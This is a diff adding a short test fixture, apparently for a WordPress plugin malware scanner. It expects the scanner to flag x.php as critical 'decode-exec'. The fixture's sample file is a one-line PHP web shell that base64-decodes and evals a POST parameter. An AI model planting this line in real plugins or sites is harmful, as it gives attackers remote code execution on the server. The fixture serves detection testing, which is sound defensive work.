@@ -1,0 +1,13 @@
+eco: wp-plugin
+note: eval(base64_decode($x))
+new: {x.php: '<?php eval(base64_decode($_POST[''d'']));'}
+features_old: []
+features_new:
+- kind: eval
+  key: eval
+  path: x.php
+  line: 1
+  attrs: {source: request, arg: 'base64_decode($_POST[''d''])'}
+expect:
+- {id: decode-exec, min_severity: critical}
+forbid: [eval-dynamic]
